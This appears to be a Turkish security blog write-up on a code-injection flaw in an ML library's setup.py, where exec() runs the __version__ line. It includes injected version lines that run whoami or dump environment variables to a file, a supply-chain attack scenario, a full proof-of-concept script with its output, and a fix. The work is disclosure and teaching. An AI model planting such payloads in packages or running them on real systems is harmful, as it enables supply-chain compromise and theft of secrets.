---
title: "Bir ML Kütüphanesinin setup.py Dosyasında exec() ile RCE"
date: 2026-03-23 01:00:00 +0300
categories: [write-up, source-code-analysis]
tags: [python, rce, code-injection, supply-chain, source-code-analysis]
---

Bir akşam açık kaynak ML kütüphanelerinin kodlarını okuyordum — spesifik bir şey aramıyordum, bazı insanlar yatmadan önce Reddit okur ya, ben de `setup.py` okuyordum. Sonra bir `exec()` gördüm. "Tamam bu bağlamda sorun yok" türünden bir `exec()` değil. İnsanı koltuğunda doğrultan cinsten.

---

## Keşif: 14 Satırlık Güven Problemi

Söz konusu dosya: `setup.py`, satır 8–14. Paket kurulumu sırasında versiyon bilgisini okuyan bir yardımcı fonksiyon:

```python
def _get_sonnet_version():
  with open('sonnet/__init__.py') as fp:
    for line in fp:
      if line.startswith('__version__'):
        g = {}
        exec(line, g)  # ← işte tam burası
        return g['__version__']
    raise ValueError('`__version__` not defined in `sonnet/__init__.py`')
```

Ne yapıyor adım adım bakalım:

1. `sonnet/__init__.py`'ı açıyor
2. Satır satır okuyor
3. `__version__` ile başlayan satırı buluyor
4. **O satırı komple Python kodu olarak çalıştırıyor**
5. Ortaya çıkan namespace'den versiyonu alıyor

4. adım işlerin ilginçleştiği yer. Fonksiyon versiyon string'ini parse etmiyor — *çalıştırıyor*. O satırda ne yazıyorsa, tam Python yetkileriyle execute ediliyor. Sandbox yok. Doğrulama yok. Soru sorma yok.

---

## Neden Önemli

Normal şartlarda `sonnet/__init__.py` şöyle bir şey içeriyor:

```python
__version__ = "2.0.3"
```

Zararsız. `exec()` çalıştırıyor, `g['__version__']` `"2.0.3"` oluyor, herkes evine gidiyor.

Ama `exec()` senin niyetinle ilgilenmiyor. Sözdizimi ile ilgileniyor. Ve şu da gayet geçerli bir Python satırı:

```python
__version__ = "2.0.3"; import subprocess; subprocess.run(["cmd", "/c", "whoami > C:/pwned.txt"])
```

Tek satır. `__version__` ile başlıyor. `startswith` kontrolünden geçiyor. Tamamen çalıştırılıyor. Versiyon atanıyor *ve* sistem komutu çalışıyor. Fonksiyon hiçbir şey olmamış gibi `"2.0.3"` döndürüyor.

---

## Saldırı Senaryosu

Bu nasıl gerçek bir probleme dönüşüyor:

**Adım 1** — Saldırgan repoyu fork'luyor ve `sonnet/__init__.py`'ı değiştiriyor:

```python
__version__ = "2.0.3.dev"; import os; open("/tmp/stolen.txt", "w").write(os.popen("env").read())
```

**Adım 2** — Saldırgan değiştirilmiş paketi dağıtıyor. Bu şunlardan biri olabilir:
- PyPI'da typosquatting (`dm-sonet`, `dm-sonnett`)
- Bir requirements dosyasında manipüle edilmiş bağımlılık
- Code review'dan sızan bir pull request (`__init__.py`'da tek satır değişiklik)

**Adım 3** — Kurban `pip install` çalıştırıyor ve zararlı kod kurulum sırasında — kütüphanenin tek bir satır kodu bile çalışmadan — execute ediliyor.

İşin güzel (korkunç?) tarafı: `_get_sonnet_version()` sadakatle `"2.0.3.dev"` döndürüyor. Kurulum normal tamamlanıyor. Hata yok. Uyarı yok. Payload `setup.py`'ın 14. satırında çalıştı ve kurulum çıktısında hiçbir iz bırakmadı.

---

## PoC

**Ortam**

```
Python   == 3.13.1
OS       == Windows 10
```

**Zaafiyetli `setup.py` fonksiyonu, izole edilmiş hali:**

```python
import subprocess
import tempfile
import os
import shutil

def create_malicious_payload():
    temp_dir = tempfile.mkdtemp(prefix="sonnet_poc_")
    os.makedirs(os.path.join(temp_dir, "sonnet"), exist_ok=True)

    # Payload: __version__ set ediyor VE RCE'yi kanıtlamak için dosya yazıyor
    payload = '__version__ = "2.0.3.dev"; import os; open("C:/PWNED.txt", "w").write("RCE SUCCESS: " + os.getlogin())'

    with open(os.path.join(temp_dir, "sonnet", "__init__.py"), "w") as f:
        f.write(payload)

    # Zaafiyetli fonksiyonun birebir kopyası
    setup_code = '''
def _get_sonnet_version():
  with open('sonnet/__init__.py') as fp:
    for line in fp:
      if line.startswith('__version__'):
        g = {}
        exec(line, g)  # VULNERABLE
        return g['__version__']

version = _get_sonnet_version()
print(f"Version: {version}")
'''

    with open(os.path.join(temp_dir, "setup.py"), "w") as f:
        f.write(setup_code)

    return temp_dir

if __name__ == "__main__":
    poc_dir = create_malicious_payload()
    print(f"[+] Created malicious setup in: {poc_dir}")

    subprocess.run(["python", "setup.py"], cwd=poc_dir)

    if os.path.exists("C:/PWNED.txt"):
        print("[+] RCE SUCCESSFUL - Payload executed!")
        with open("C:/PWNED.txt") as f:
            print(f"[+] Output: {f.read()}")

    shutil.rmtree(poc_dir)
```

**Çıktı:**

```
[+] Created malicious setup in: C:\Users\...\sonnet_poc_xyz
Version: 2.0.3.dev
[+] RCE SUCCESSFUL - Payload executed!
[+] Output: RCE SUCCESS: Monster
```

Fonksiyon versiyonu doğru döndürdü. Aynı zamanda keyfi kod da çalıştırdı. İkisi de oldu. İkisi de birbirinden şikayetçi değil.

---

## Düzeltme

`exec()`'i string parsing ile değiştir. Bir string'i *okumak* için *çalıştırmana* gerek yok:

```python
def _get_sonnet_version():
  with open('sonnet/__init__.py') as fp:
    for line in fp:
      if line.startswith('__version__'):
        version = line.split('=')[1].strip().strip('"\'')
        return version
    raise ValueError('`__version__` not defined in `sonnet/__init__.py`')
```

Ya da `ast.literal_eval()` kullan, daha şık olsun istiyorsan. Mesele şu: bir string'i parse etmek ile bir string'i execute etmek çok farklı iki işlem ve sadece birisi makinene backdoor kurabilir.

---

## Kaynak Kod Analizi Yaparken Bunlara Dikkat Edin

Bu kalıp düşündüğünüzden daha sık karşınıza çıkıyor, özellikle Python ekosistemindeki `setup.py` dosyalarında:

**Dosya içeriği üzerinde `exec()` ve `eval()`.** Bir build script dosya okuyup içeriğini `exec()`'e veriyorsa, o dosya bir saldırı vektörüne dönüşür. `setup.py` kurulum sırasında çalışır — herhangi bir `import` yapmadan önce — yani saldırı yüzeyi kütüphaneyi hiç kullanmasanız bile mevcuttur.

**"X ile başlıyor" varsayımı.** Fonksiyon `line.startswith('__version__')` kontrolü yapıp gerisine güveniyor. Bu yaygın bir kalıp: prefix'i doğrula, gerisini güvenli say. Saldırganlar bunu sever.

**Supply chain saldırı vektörü.** Zafiyet kütüphanenin runtime kodunda değil. Build sisteminde. `exec()` çalıştıran bir `setup.py`, her `pip install`'ı potansiyel bir kod çalıştırma olayına dönüştürür. Bir projeyi denetlerken build dosyalarını atlama.

---

## Referanslar

- **CWE-94**: Improper Control of Generation of Code — [cwe.mitre.org](https://cwe.mitre.org/data/definitions/94.html)
- **CWE-95**: Improper Neutralization of Directives in Dynamically Evaluated Code — [cwe.mitre.org](https://cwe.mitre.org/data/definitions/95.html)
- **OWASP Code Injection**: [owasp.org](https://owasp.org/www-community/attacks/Code_Injection)

---

Python `3.13.1` | Mart 2026
